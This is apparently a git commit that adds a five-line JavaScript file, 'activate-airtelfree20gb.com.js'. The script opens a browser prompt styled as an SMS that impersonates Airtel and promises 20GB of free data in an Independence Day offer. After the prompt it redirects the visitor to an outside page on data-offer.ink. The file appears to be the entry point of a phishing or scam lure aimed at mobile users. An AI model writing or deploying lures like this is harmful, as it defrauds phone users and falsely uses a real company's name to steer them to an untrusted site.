4dde7c8de316a71aa92e3aa64ac78c5ad90cf9ad
katemj25 <mbokofficial1@gmail.com>
2025-06-29 17:48:22 -0700

    Create activate-airtelfree20gb.com.js

---
+++ activate-airtelfree20gb.com.js
@@ -0,0 +1,5 @@
+var password = '20GB Free Data'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 20GB Free Data From Airtel Independence day celebation Offer, Kindly Press OK to ACTIVATE. ','20GB Free Data');
+if (password != '20GB Free Data') {
+location.href='https://data-offer.ink/activate-airtelfree20gb.com.html';
+}
